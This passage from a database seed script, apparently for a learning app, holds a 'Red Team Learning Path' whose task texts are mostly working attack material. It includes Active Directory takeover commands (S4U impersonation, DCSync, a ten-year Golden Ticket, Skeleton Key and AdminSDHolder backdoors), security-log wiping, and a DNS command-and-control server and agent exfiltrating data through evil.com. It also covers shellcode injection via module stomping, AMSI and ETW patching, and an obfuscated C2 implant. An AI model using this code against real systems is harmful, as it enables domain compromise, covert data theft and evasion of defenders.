impacket-getTGT corp.local/svc_sql:SQLService123!

# S4U to get ticket for administrator to DC
impacket-getST -spn cifs/dc01.corp.local -impersonate administrator \\
    corp.local/svc_sql:SQLService123!

# Use ticket
export KRB5CCNAME=administrator.ccache
impacket-psexec corp.local/administrator@dc01 -k -no-pass
\`\`\``
				},
				{
					title: 'Achieve Domain Dominance and Persistence',
					description: 'DCSync, Golden Ticket, and establish persistence',
					details: `## Domain Dominance

### DCSync - Dump All Hashes

\`\`\`bash
# With Domain Admin access
impacket-secretsdump corp.local/administrator@dc01 -k -no-pass

# Or use your custom DCSync tool
agent03> upload dcsync.py
agent03> shell python dcsync.py -d corp.local -u administrator

# Get krbtgt hash for Golden Ticket
# krbtgt:aad3b435b51404eeaad3b435b51404ee
\`\`\`

### Golden Ticket

\`\`\`bash
# Create Golden Ticket
impacket-ticketer -nthash <krbtgt_hash> \\
    -domain-sid S-1-5-21-... \\
    -domain corp.local \\
    -duration 3650 \\  # 10 years
    administrator

# Now you have persistent domain access
export KRB5CCNAME=administrator.ccache
impacket-psexec corp.local/administrator@dc01 -k -no-pass
\`\`\`

### Persistence Methods

#### 1. AdminSDHolder Backdoor
\`\`\`powershell
# Add your user to AdminSDHolder ACL
# They'll get Domain Admin after SDProp runs (60 min)
Import-Module ActiveDirectory
$user = Get-ADUser -Identity "youruser"
$acl = Get-ACL "AD:CN=AdminSDHolder,CN=System,DC=corp,DC=local"
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $user.SID, "GenericAll", "Allow")
$acl.AddAccessRule($ace)
Set-ACL -Path "AD:CN=AdminSDHolder,CN=System,DC=corp,DC=local" -AclObject $acl
\`\`\`

#### 2. Skeleton Key
\`\`\`bash
# Patch LSASS on DC - any user can auth with "mimikatz" password
agent03> shell mimikatz.exe "privilege::debug" "misc::skeleton"
# Now alice:mimikatz works for any account
\`\`\`

#### 3. Custom Persistence
\`\`\`bash
# Use your persistence toolkit
agent03> upload persistence.exe
agent03> shell persistence.exe install --method wmi --payload beacon.exe
agent03> shell persistence.exe install --method schtask --payload beacon.exe
\`\`\`

### Document and Clean
\`\`\`bash
# Document for report
- Initial access method
- Credentials obtained
- Attack path used
- Persistence established

# Clean up (but leave persistence for re-access)
agent03> shell del C:\\Windows\\Temp\\*.exe
agent03> shell wevtutil cl Security
\`\`\``
				}
			]
		},
		{
			name: 'Bonus: Covert Communication Channels',
			description: 'Alternative C2 channels for stealth',
			tasks: [
				{
					title: 'Build a DNS C2 Channel',
					description: 'Encode commands and data in DNS queries',
					details: `## DNS C2 Channel

### Why DNS?
- Usually allowed through firewalls
- Blends with normal traffic
- Encrypted options (DoH/DoT)

### Protocol Design
\`\`\`
Command to Agent:
  Agent queries: <agent_id>.cmd.evil.com
  Server responds: TXT record with base64 command

Data to Server:
  Agent queries: <base64_chunk>.<seq>.<agent_id>.data.evil.com
  Server responds: A record (acknowledgment)
\`\`\`

### Go DNS Server

\`\`\`go
package main

import (
    "encoding/base64"
    "log"
    "strings"
    "sync"

    "github.com/miekg/dns"
)

type DNSC2 struct {
    domain    string
    tasks     map[string][]string // agent_id -> pending tasks
    results   map[string][]string // agent_id -> results
    mu        sync.RWMutex
}

func (c *DNSC2) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
    m := new(dns.Msg)
    m.SetReply(r)

    for _, q := range r.Question {
        name := strings.ToLower(q.Name)
        parts := strings.Split(strings.TrimSuffix(name, "."), ".")

        switch q.Qtype {
        case dns.TypeTXT:
            // Agent requesting task
            if len(parts) >= 3 && parts[1] == "cmd" {
                agentID := parts[0]
                task := c.getTask(agentID)
                if task != "" {
                    encoded := base64.StdEncoding.EncodeToString([]byte(task))
                    rr := &dns.TXT{
                        Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
                        Txt: []string{encoded},
                    }
                    m.Answer = append(m.Answer, rr)
                }
            }

        case dns.TypeA:
            // Agent sending data
            if len(parts) >= 4 && parts[2] == "data" {
                data := parts[0]
                seq := parts[1]
                agentID := parts[3]
                c.storeResult(agentID, seq, data)

                // Acknowledge
                rr := &dns.A{
                    Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 0},
                    A:   net.ParseIP("127.0.0.1"),
                }
                m.Answer = append(m.Answer, rr)
            }
        }
    }

    w.WriteMsg(m)
}

func main() {
    c2 := &DNSC2{
        domain:  "evil.com",
        tasks:   make(map[string][]string),
        results: make(map[string][]string),
    }

    dns.HandleFunc("evil.com.", c2.handleDNS)
    log.Fatal(dns.ListenAndServe(":53", "udp", nil))
}
\`\`\`

### DNS Agent

\`\`\`go
func dnsGetTask(agentID, c2Domain string) string {
    query := fmt.Sprintf("%s.cmd.%s", agentID, c2Domain)

    m := new(dns.Msg)
    m.SetQuestion(dns.Fqdn(query), dns.TypeTXT)

    c := new(dns.Client)
    r, _, _ := c.Exchange(m, "8.8.8.8:53")

    for _, ans := range r.Answer {
        if txt, ok := ans.(*dns.TXT); ok {
            decoded, _ := base64.StdEncoding.DecodeString(txt.Txt[0])
            return string(decoded)
        }
    }
    return ""
}

func dnsSendData(agentID, c2Domain, data string) {
    encoded := base64.RawURLEncoding.EncodeToString([]byte(data))

    chunkSize := 60 // Max subdomain length
    for i := 0; i < len(encoded); i += chunkSize {
        end := i + chunkSize
        if end > len(encoded) {
            end = len(encoded)
        }
        chunk := encoded[i:end]
        query := fmt.Sprintf("%s.%d.%s.data.%s", chunk, i/chunkSize, agentID, c2Domain)

        m := new(dns.Msg)
        m.SetQuestion(dns.Fqdn(query), dns.TypeA)

        c := new(dns.Client)
        c.Exchange(m, "8.8.8.8:53")

        time.Sleep(100 * time.Millisecond)
    }
}
\`\`\``
				},
				{
					title: 'Build a SOCKS Proxy for Pivoting',
					description: 'Tunnel traffic through compromised hosts',
					details: `## SOCKS5 Proxy for Pivoting

### Use Case
\`\`\`
Attacker <---> Compromised Host <---> Internal Network
              (SOCKS proxy)
\`\`\`

### Go SOCKS5 Server

\`\`\`go
package main

import (
    "io"
    "log"
    "net"
)

func handleSOCKS5(conn net.Conn) {
    defer conn.Close()

    // Read version and auth methods
    buf := make([]byte, 256)
    n, _ := conn.Read(buf)
    if n < 2 || buf[0] != 0x05 {
        return
    }

    // No auth required
    conn.Write([]byte{0x05, 0x00})

    // Read connect request
    n, _ = conn.Read(buf)
    if n < 7 || buf[0] != 0x05 || buf[1] != 0x01 {
        return
    }

    var targetAddr string
    switch buf[3] {
    case 0x01: // IPv4
        targetAddr = fmt.Sprintf("%d.%d.%d.%d:%d",
            buf[4], buf[5], buf[6], buf[7],
            int(buf[8])<<8|int(buf[9]))
    case 0x03: // Domain
        domainLen := int(buf[4])
        domain := string(buf[5 : 5+domainLen])
        port := int(buf[5+domainLen])<<8 | int(buf[6+domainLen])
        targetAddr = fmt.Sprintf("%s:%d", domain, port)
    case 0x04: // IPv6
        // Handle IPv6
    }

    // Connect to target
    target, err := net.Dial("tcp", targetAddr)
    if err != nil {
        conn.Write([]byte{0x05, 0x01, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
        return
    }
    defer target.Close()

    // Success response
    conn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0})

    // Proxy data
    go io.Copy(target, conn)
    io.Copy(conn, target)
}

func main() {
    listener, _ := net.Listen("tcp", ":1080")
    log.Println("SOCKS5 proxy on :1080")

    for {
        conn, _ := listener.Accept()
        go handleSOCKS5(conn)
    }
}
\`\`\`

### Reverse SOCKS (Agent Initiated)

\`\`\`go
// Agent connects OUT to server
// Server provides SOCKS interface

// On agent:
func reverseSOCKS(serverAddr string) {
    for {
        conn, err := net.Dial("tcp", serverAddr)
        if err != nil {
            time.Sleep(30 * time.Second)
            continue
        }

        // Read SOCKS requests from server
        // Execute connects locally
        // Tunnel data back

        handleReverseSOCKS(conn)
    }
}
\`\`\`

### Usage with Proxychains

\`\`\`bash
# /etc/proxychains.conf
socks5 127.0.0.1 1080

# Use any tool through proxy
proxychains nmap -sT 10.0.0.0/24
proxychains impacket-psexec corp.local/admin@10.0.0.10
\`\`\``
				}
			]
		},
		{
			name: 'Bonus: Advanced Injection Techniques',
			description: 'Stealthier code execution methods',
			tasks: [
				{
					title: 'Implement Process Hollowing',
					description: 'Replace legitimate process memory with malicious code',
					details: `## Process Hollowing

Already covered in Windows Internals module. Key points:
- Create process SUSPENDED
- Unmap original image
- Write malicious PE
- Update thread context
- Resume

See Windows Internals module for full implementation.`
				},
				{
					title: 'Implement Threadless Injection',
					description: 'Execute code without creating suspicious threads',
					details: `## Threadless Injection

### Why Threadless?
- CreateRemoteThread is heavily monitored
- No suspicious thread creation events
- Uses existing threads via callbacks

### Callback-based Execution

\`\`\`c
// Abuse existing callbacks in target process

// Method 1: Thread Pool callbacks
// Hijack TP_CALLBACK_ENVIRON

// Method 2: Vectored Exception Handler
// Install VEH, trigger exception, execute in handler

// Method 3: Instrumentation Callbacks
// Use Ntdll's Instrumentation Callback mechanism
\`\`\`

### Example: TLS Callback Injection

\`\`\`c
// TLS callbacks execute before main()
// If you can write to a process's TLS directory...

#include <windows.h>

// TLS callback that runs our code
void NTAPI TlsCallback(PVOID DllHandle, DWORD Reason, PVOID Reserved) {
    if (Reason == DLL_PROCESS_ATTACH) {
        // Execute shellcode
        ((void(*)())shellcode_addr)();
    }
}

// Register TLS callback
#pragma comment(linker, "/INCLUDE:_tls_used")
#pragma const_seg(".CRT\\$XLB")
PIMAGE_TLS_CALLBACK TlsCallbacks[] = { TlsCallback, NULL };
#pragma const_seg()
\`\`\`

### Module Stomping

\`\`\`c
// Overwrite legitimate DLL with shellcode
// Looks like code in valid module

HMODULE hModule = LoadLibraryA("amsi.dll"); // Any DLL

// Find .text section
PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hModule;
PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)dos + dos->e_lfanew);
PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);

for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
    if (strcmp((char*)section[i].Name, ".text") == 0) {
        LPVOID textSection = (BYTE*)hModule + section[i].VirtualAddress;

        // Make writable
        DWORD old;
        VirtualProtect(textSection, section[i].Misc.VirtualSize,
            PAGE_EXECUTE_READWRITE, &old);

        // Copy shellcode
        memcpy(textSection, shellcode, shellcode_size);

        // Execute - code appears to be in amsi.dll
        ((void(*)())textSection)();
    }
}
\`\`\``
				}
			]
		},
		{
			name: 'Capstone: Full C2 Framework',
			description: 'Build a complete C2 framework from scratch',
			tasks: [
				{
					title: 'Design C2 Architecture',
					description: 'Plan the teamserver, listeners, and agent components',
					details: `## C2 Framework Architecture

### Components
\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│                         TEAMSERVER (Go)                          │
├─────────────────────────────────────────────────────────────────┤
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐          │
│  │   Listeners  │  │   Payload    │  │   Database   │          │
│  │              │  │   Generator  │  │   (SQLite)   │          │
│  │ - HTTP/S     │  │              │  │              │          │
│  │ - DNS        │  │ - Shellcode  │  │ - Agents     │          │
│  │ - SMB        │  │ - EXE/DLL    │  │ - Tasks      │          │
│  │ - TCP        │  │ - Scripts    │  │ - Loot       │          │
│  └──────────────┘  └──────────────┘  └──────────────┘          │
├─────────────────────────────────────────────────────────────────┤
│                          REST API                                │
│               (for operators / web UI)                           │
└─────────────────────────────────────────────────────────────────┘
                              │
              ┌───────────────┼───────────────┐
              │               │               │
              ▼               ▼               ▼
        ┌──────────┐   ┌──────────┐   ┌──────────┐
        │  Agent   │   │  Agent   │   │  Agent   │
        │  (Go)    │   │  (Go)    │   │  (Go)    │
        └──────────┘   └──────────┘   └──────────┘
\`\`\`

### Development Phases

**Phase 1: Basic Functionality**
- HTTP/S listener
- Agent check-in
- Command execution
- File transfer

**Phase 2: Evasion**
- Encrypted communications
- Sleep obfuscation
- Direct syscalls
- AMSI/ETW bypass

**Phase 3: Post-Exploitation**
- Token manipulation
- Credential dumping
- Process injection
- Lateral movement

**Phase 4: Advanced**
- P2P communication
- BOF execution
- SOCKS proxy
- Web UI`
				},
				{
					title: 'Implement Core Teamserver',
					description: 'Build the server with listener management and agent handling',
					details: `## Teamserver Implementation

### Project Structure
\`\`\`
c2/
├── cmd/
│   ├── server/main.go
│   └── agent/main.go
├── pkg/
│   ├── server/
│   │   ├── server.go
│   │   ├── listener.go
│   │   └── handlers.go
│   ├── agent/
│   │   ├── agent.go
│   │   ├── commands.go
│   │   └── evasion.go
│   ├── crypto/
│   │   └── aes.go
│   └── protocol/
│       └── messages.go
├── go.mod
└── README.md
\`\`\`

### Core Server

\`\`\`go
// pkg/server/server.go
package server

type Teamserver struct {
    listeners map[string]*Listener
    agents    map[string]*Agent
    tasks     map[string][]*Task
    db        *sql.DB
    mu        sync.RWMutex
}

type Agent struct {
    ID         string
    Hostname   string
    Username   string
    OS         string
    PID        int
    LastSeen   time.Time
    Listener   string
}

type Task struct {
    ID        string
    AgentID   string
    Command   string
    Args      []string
    Status    string
    Output    string
    CreatedAt time.Time
}

func NewTeamserver() *Teamserver {
    ts := &Teamserver{
        listeners: make(map[string]*Listener),
        agents:    make(map[string]*Agent),
        tasks:     make(map[string][]*Task),
    }
    ts.initDB()
    return ts
}

func (ts *Teamserver) StartListener(config ListenerConfig) error {
    listener := NewListener(config, ts)
    ts.listeners[config.Name] = listener
    go listener.Start()
    return nil
}
\`\`\`

### HTTP Listener

\`\`\`go
// pkg/server/listener.go
type Listener struct {
    config ListenerConfig
    ts     *Teamserver
    server *http.Server
}

func (l *Listener) Start() error {
    mux := http.NewServeMux()
    mux.HandleFunc("/api/checkin", l.handleCheckin)
    mux.HandleFunc("/api/task", l.handleTask)
    mux.HandleFunc("/api/result", l.handleResult)

    l.server = &http.Server{
        Addr:    l.config.BindAddr,
        Handler: mux,
    }

    if l.config.TLS {
        return l.server.ListenAndServeTLS(l.config.CertFile, l.config.KeyFile)
    }
    return l.server.ListenAndServe()
}

func (l *Listener) handleCheckin(w http.ResponseWriter, r *http.Request) {
    // Decrypt request
    body, _ := io.ReadAll(r.Body)
    decrypted := crypto.Decrypt(body, l.config.Key)

    var checkin AgentCheckin
    json.Unmarshal(decrypted, &checkin)

    // Register or update agent
    l.ts.registerAgent(&checkin, l.config.Name)

    // Get pending tasks
    tasks := l.ts.getPendingTasks(checkin.ID)

    // Encrypt and respond
    response, _ := json.Marshal(tasks)
    encrypted := crypto.Encrypt(response, l.config.Key)
    w.Write(encrypted)
}
\`\`\``
				},
				{
					title: 'Implement Agent with Evasion',
					description: 'Build the implant with all evasion techniques',
					details: `## Agent Implementation

### Core Agent

\`\`\`go
// pkg/agent/agent.go
package agent

type Agent struct {
    ID        string
    Config    AgentConfig
    Commands  map[string]CommandFunc
}

type AgentConfig struct {
    C2Server   string
    AESKey     []byte
    Sleep      time.Duration
    Jitter     float64
    KillDate   time.Time
}

type CommandFunc func(args []string) (string, error)

func NewAgent(config AgentConfig) *Agent {
    a := &Agent{
        ID:       generateID(),
        Config:   config,
        Commands: make(map[string]CommandFunc),
    }
    a.registerCommands()
    return a
}

func (a *Agent) registerCommands() {
    a.Commands["shell"] = a.cmdShell
    a.Commands["download"] = a.cmdDownload
    a.Commands["upload"] = a.cmdUpload
    a.Commands["ps"] = a.cmdProcessList
    a.Commands["inject"] = a.cmdInject
    a.Commands["exit"] = a.cmdExit
}

func (a *Agent) Run() {
    for {
        if time.Now().After(a.Config.KillDate) {
            os.Exit(0)
        }

        tasks := a.checkin()
        for _, task := range tasks {
            result := a.executeTask(task)
            a.sendResult(result)
        }

        a.sleep()
    }
}

func (a *Agent) sleep() {
    jitter := a.Config.Sleep.Seconds() * a.Config.Jitter
    variation := (rand.Float64()*2 - 1) * jitter
    sleepTime := a.Config.Sleep + time.Duration(variation)*time.Second

    // Sleep obfuscation
    evasion.ObfuscatedSleep(a.getImageBase(), a.getImageSize(), sleepTime)
}
\`\`\`

### Evasion Module

\`\`\`go
// pkg/agent/evasion/evasion.go
package evasion

func init() {
    // Patch AMSI
    PatchAMSI()

    // Patch ETW
    PatchETW()

    // Unhook ntdll
    UnhookNtdll()
}

func PatchAMSI() {
    amsi := syscall.NewLazyDLL("amsi.dll")
    scanBuffer := amsi.NewProc("AmsiScanBuffer")

    patch := []byte{0x48, 0x31, 0xC0, 0xC3} // xor rax, rax; ret

    var old uint32
    VirtualProtect(scanBuffer.Addr(), 4, 0x40, &old)
    copy((*[4]byte)(unsafe.Pointer(scanBuffer.Addr()))[:], patch)
    VirtualProtect(scanBuffer.Addr(), 4, old, &old)
}

func PatchETW() {
    ntdll := syscall.NewLazyDLL("ntdll.dll")
    etwEventWrite := ntdll.NewProc("EtwEventWrite")

    patch := []byte{0xC3} // ret

    var old uint32
    VirtualProtect(etwEventWrite.Addr(), 1, 0x40, &old)
    *(*byte)(unsafe.Pointer(etwEventWrite.Addr())) = patch[0]
    VirtualProtect(etwEventWrite.Addr(), 1, old, &old)
}

func UnhookNtdll() {
    // Read clean ntdll from disk
    // Replace .text section in memory
}

func ObfuscatedSleep(imageBase uintptr, imageSize int, duration time.Duration) {
    // Encrypt image, sleep, decrypt
    key := generateKey()

    // RWX -> RW
    VirtualProtect(imageBase, imageSize, PAGE_READWRITE, &old)

    // Encrypt
    encryptMemory(imageBase, imageSize, key)

    // Sleep
    time.Sleep(duration)

    // Decrypt
    decryptMemory(imageBase, imageSize, key)

    // RW -> RX
    VirtualProtect(imageBase, imageSize, PAGE_EXECUTE_READ, &old)
}
\`\`\`

### Build
\`\`\`bash
# Build agent with obfuscation
garble -literals -tiny build -ldflags="-s -w" -o agent.exe ./cmd/agent

# Cross-compile
GOOS=windows GOARCH=amd64 garble build -o agent.exe ./cmd/agent
\`\`\``
				}
			]
		}
	]
};

async function seed() {
	console.log('Seeding Red Team Learning Path...');

	const pathResult = db.insert(schema.paths).values({
		name: redteamPath.name,
		description: redteamPath.description,
		color: redteamPath.color,
		language: redteamPath.language,
		skills: redteamPath.skills,
		startHint: redteamPath.startHint,
		difficulty: redteamPath.difficulty,
		estimatedWeeks: redteamPath.estimatedWeeks,
		schedule: redteamPath.schedule
	}).returning().get();

	console.log(`Created path: ${redteamPath.name}`);

	for (let i = 0; i < redteamPath.modules.length; i++) {
		const mod = redteamPath.modules[i];
		const moduleResult = db.insert(schema.modules).values({
			pathId: pathResult.id,
			name: mod.name,
			description: mod.description,
			orderIndex: i
		}).returning().get();

		console.log(`  Created module: ${mod.name}`);

		for (let j = 0; j < mod.tasks.length; j++) {
			const task = mod.tasks[j];
			db.insert(schema.tasks).values({
				moduleId: moduleResult.id,
				title: task.title,
				description: task.description,
				details: task.details,
				orderIndex: j,
				completed: false
			}).run();
		}
		console.log(`    Added ${mod.tasks.length} tasks`);
	}

	console.log('\nSeeding complete!');
}

seed().catch(console.error);
